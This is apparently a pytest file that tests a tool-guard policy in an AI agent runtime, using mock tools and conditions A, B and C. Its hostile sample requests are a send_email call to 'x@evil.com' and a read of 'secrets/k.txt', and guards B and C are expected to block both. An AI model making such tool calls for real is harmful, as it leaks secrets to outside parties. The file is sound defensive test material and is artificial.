"""TL-U01 / TL-A01 through Runtime + SQLite evidence under A, B and C."""

import pytest
from enums import Decision, RunStatus

from evidence.collector import EvidenceCollector
from evidence.sqlite_repository import SQLiteEvidenceRepository
from runtime.adapter import RuntimeAdapter
from runtime.dto import RuntimeRequest, ToolRequest
from runtime.mock_tools.tools import MockReadFile, MockSendEmail
from security.plugins.guards.tool_guard import ToolPolicy
from security.policy.conditions import load_condition, make_condition_security_factory

POLICY = ToolPolicy(allowed_tools=frozenset({"read_file"}), allowed_path_prefixes=("docs",))


def _run(tmp_path, name, tool_request):
    repository = SQLiteEvidenceRepository(tmp_path / f"{name}.db")
    collector = EvidenceCollector(repository)
    send_email, read_file = MockSendEmail(), MockReadFile({"docs/a.txt": "hello", "secrets/k.txt": "key"})
    result = RuntimeAdapter().run(
        RuntimeRequest(user_input="Summarize the document.", context_items=[], session_id=f"s-{name}",
                       scenario_id="TL", tool_request=tool_request),
        tools={"read_file": read_file, "send_email": send_email},
        evidence=collector,
        security_factory=make_condition_security_factory(load_condition(name), collector, tool_policy=POLICY),
    )
    return result, send_email, read_file, repository.list_events_by_run(result.identity.run_id)


FORBIDDEN = ToolRequest(tool_name="send_email", tool_arguments={"to": ["x@evil.com"], "subject": "s", "body": "b"})
OUT_OF_SCOPE = ToolRequest(tool_name="read_file", tool_arguments={"path": "secrets/k.txt"})
BENIGN = ToolRequest(tool_name="read_file", tool_arguments={"path": "docs/a.txt"})


@pytest.mark.parametrize("name", ["B", "C"])
def test_forbidden_tool_is_blocked_with_zero_calls(tmp_path, name):
    result, send_email, _, events = _run(tmp_path, name, FORBIDDEN)
    assert result.run_status == RunStatus.COMPLETED
    assert result.decision.decision == Decision.BLOCK and result.execution.executed is False
    assert send_email.call_count == 0
    tool = [e for e in events if e.event_type == "SECURITY_RESULT" and e.payload["guard_name"] == "tool_guard"]
    assert tool and "tool_guard.unauthorized_tool" in str(tool[-1].payload)


@pytest.mark.parametrize("name", ["B", "C"])
def test_out_of_scope_path_is_blocked_with_zero_calls(tmp_path, name):
    result, _, read_file, _ = _run(tmp_path, name, OUT_OF_SCOPE)
    assert result.decision.decision == Decision.BLOCK and read_file.call_count == 0


@pytest.mark.parametrize("name", ["B", "C"])
def test_benign_read_in_scope_still_runs(tmp_path, name):
    result, _, read_file, _ = _run(tmp_path, name, BENIGN)
    assert result.decision.decision == Decision.ALLOW and read_file.call_count == 1


def test_condition_a_has_no_tool_guard_so_the_forbidden_tool_runs(tmp_path):
    result, send_email, _, _ = _run(tmp_path, "A", FORBIDDEN)
    assert result.decision.decision == Decision.ALLOW and send_email.call_count == 1
